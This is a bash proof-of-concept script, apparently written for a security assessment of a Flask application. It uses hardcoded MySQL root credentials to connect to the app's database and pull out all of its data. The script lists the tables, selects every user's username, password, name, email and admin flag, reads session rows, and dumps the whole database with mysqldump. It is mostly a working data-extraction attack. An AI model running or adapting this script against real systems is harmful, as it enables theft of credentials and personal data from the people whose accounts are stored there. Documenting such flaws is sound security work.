#!/bin/bash

# POC: Complete Data Extraction via Direct MySQL Database Access with Root Credentials
# Vulnerability: Hardcoded root database credentials (root:app_conf) in Flask application
# Target: MySQL database at 'db' host with database name 'database'

set -e

DB_HOST="${DB_HOST:-db}"
DB_USER="root"
DB_PASS="app_conf"
DB_NAME="database"

echo "[*] POC: Complete Data Extraction via MySQL Root Credentials"
echo "[*] Target Database: $DB_HOST"
echo ""

# Check if mysql client is available, if not try to install
if ! command -v mysql &> /dev/null; then
    echo "[!] mysql client not found. Attempting to install..."
    apt-get update > /dev/null 2>&1 || true
    apt-get install -y mysql-client > /dev/null 2>&1 || true
fi

# Function to execute MySQL query
execute_query() {
    local query="$1"
    local description="$2"
    
    echo "[+] $description"
    echo "    Query: $query"
    echo ""
    
    # Execute the query and capture output
    local output=$(mysql -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" -e "$query" 2>&1 || echo "")
    
    if [ -z "$output" ]; then
        echo "[!] Failed to execute query or no results"
        return 1
    fi
    
    echo "$output"
    echo ""
    return 0
}

# Test 1: Verify database connectivity and list tables
echo "=== TEST 1: Verify Database Access and List Tables ==="
execute_query "SHOW TABLES;" "Listing all tables in the database"

# Test 2: Extract all users including credentials and personal information
echo "=== TEST 2: Extract All Users (Credentials, Emails, Admin Status) ==="
execute_query "SELECT id, username, password, name, lastname, email, is_admin FROM user;" "Extracting complete user database"

# Test 3: Extract all sessions with sensitive data
echo "=== TEST 3: Extract All Active Sessions ==="
execute_query "SELECT * FROM mysessions LIMIT 10;" "Extracting session data (first 10 rows)"

# Test 4: Count records in each table to show data volume
echo "=== TEST 4: Count Records in Each Table ==="
execute_query "SELECT 'user' as table_name, COUNT(*) as record_count FROM user UNION ALL SELECT 'mysessions' as table_name, COUNT(*) FROM mysessions;" "Counting records per table"

# Test 5: Extract database structure
echo "=== TEST 5: Extract Database Structure ==="
execute_query "DESCRIBE user;" "User table structure"
echo ""
execute_query "DESCRIBE mysessions;" "Mysessions table structure"

# Test 6: Demonstrate database dump capability
echo "=== TEST 6: Demonstrate mysqldump Capability (Complete Database Export) ==="
echo "[+] Attempting mysqldump for complete database backup"

if command -v mysqldump &> /dev/null; then
    echo "    Command: mysqldump -h $DB_HOST -u $DB_USER -p$DB_PASS $DB_NAME"
    
    # Create a backup (limit to prevent large output)
    dump_output=$(mysqldump -h "$DB_HOST" -u "$DB_USER" -p"$DB_PASS" "$DB_NAME" 2>&1 | head -100)
    
    if [ ! -z "$dump_output" ]; then
        echo ""
        echo "[+] Database dump successful (first 100 lines):"
        echo "$dump_output"
        echo ""
        echo "[+] Full database backup can be saved to file:"
        echo "    mysqldump -h $DB_HOST -u $DB_USER -p$DB_PASS $DB_NAME > complete_backup.sql"
    else
        echo "[!] Failed to generate database dump"
    fi
else
    echo "[!] mysqldump not available"
fi

# Test 7: Check for any stored procedures or views
echo ""
echo "=== TEST 7: List All Stored Procedures and Views ==="
execute_query "SELECT ROUTINE_NAME FROM INFORMATION_SCHEMA.ROUTINES WHERE ROUTINE_SCHEMA = '$DB_NAME';" "Stored procedures and functions"

echo ""
echo "[+] POC COMPLETE"
echo "[+] Summary: Successfully demonstrated complete data extraction from MySQL database using hardcoded root credentials"
echo "[+] Sensitive data exposed includes:"
echo "    - User credentials and password hashes"
echo "    - User personal information (names, emails)"
echo "    - Admin account identification"
echo "    - Session data containing authentication tokens"
echo "    - Complete database structure and contents"